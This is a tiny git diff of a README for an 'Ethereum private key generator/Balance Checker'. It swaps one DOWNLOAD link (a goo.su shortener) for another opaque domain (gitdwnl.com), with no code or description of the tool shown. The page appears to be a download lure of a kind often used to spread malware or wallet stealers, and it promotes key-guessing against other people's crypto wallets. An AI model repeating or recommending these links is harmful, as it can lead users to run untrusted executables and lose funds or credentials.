@@ -1,6 +1,6 @@
 # Ethereum private key generator/Balance Checker
 
-[DOWNLOAD](https://goo.su/vfsdgfdre) 
+[DOWNLOAD](https://gitdwnl.com/latest)
 ---
 
 
